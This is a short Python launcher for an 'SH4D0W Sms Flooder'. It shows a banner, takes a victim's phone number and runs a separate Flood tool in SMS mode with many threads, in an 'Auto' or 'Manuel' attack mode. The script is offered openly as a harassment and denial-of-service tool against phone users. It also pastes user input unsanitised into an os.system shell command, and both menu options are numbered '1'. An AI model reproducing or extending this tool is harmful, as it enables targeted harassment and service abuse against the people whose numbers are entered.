from pip._vendor.colorama import Fore
import subprocess
import os
import sys

subprocess.call('clear', shell=True)



display = """

███████╗██╗  ██╗██╗  ██╗██████╗  ██████╗ ██╗    ██╗
██╔════╝██║  ██║██║  ██║██╔══██╗██╔═████╗██║    ██║
███████╗███████║███████║██║  ██║██║██╔██║██║ █╗ ██║
╚════██║██╔══██║╚════██║██║  ██║████╔╝██║██║███╗██║
███████║██║  ██║     ██║██████╔╝╚██████╔╝╚███╔███╔╝
╚══════╝╚═╝  ╚═╝     ╚═╝╚═════╝  ╚═════╝  ╚══╝╚══╝                                                    
"""                              
print(Fore.RED+display)
print(Fore.WHITE+"|"+Fore.RED+"Welcome To SH4D0W Sms Flooder"+Fore.WHITE+"|")
print()                    
                                      
print(Fore.WHITE+'|'+Fore.RED+'1'+Fore.WHITE+'|'+Fore.WHITE+' - '+Fore.WHITE+'|'+Fore.WHITE+'Auto Attack'+Fore.WHITE+'|')
print(Fore.WHITE+'|'+Fore.RED+'1'+Fore.WHITE+'|'+Fore.WHITE+' - '+Fore.WHITE+'|'+Fore.WHITE+'Manuel Attack'+Fore.WHITE+'|')
print()
attack_type = input(Fore.WHITE+"|"+Fore.RED+"Attack Type"+Fore.WHITE+"|"+Fore.WHITE+' > ')

if attack_type == '1':
  target = input(Fore.WHITE+"|"+Fore.RED+"Phone Number"+Fore.WHITE+"|"+Fore.WHITE+' > ')
  os.system("python3 Flood --tool sms --target "+target+" --timeout 200 --threads 50")


if attack_type == '2':
  target = input(Fore.WHITE+"|"+Fore.RED+"Phone Number"+Fore.WHITE+"|"+Fore.WHITE+' > ')
  timeout = input(Fore.WHITE+"|"+Fore.RED+"Timeout"+Fore.WHITE+"|"+Fore.WHITE+' > ')
  threads = input(Fore.WHITE+"|"+Fore.RED+"Threads"+Fore.WHITE+"|"+Fore.WHITE+' > ')
  os.system("python3 Flood --tool sms --target "+target+" --timeout "+timeout+" --threads "+threads)
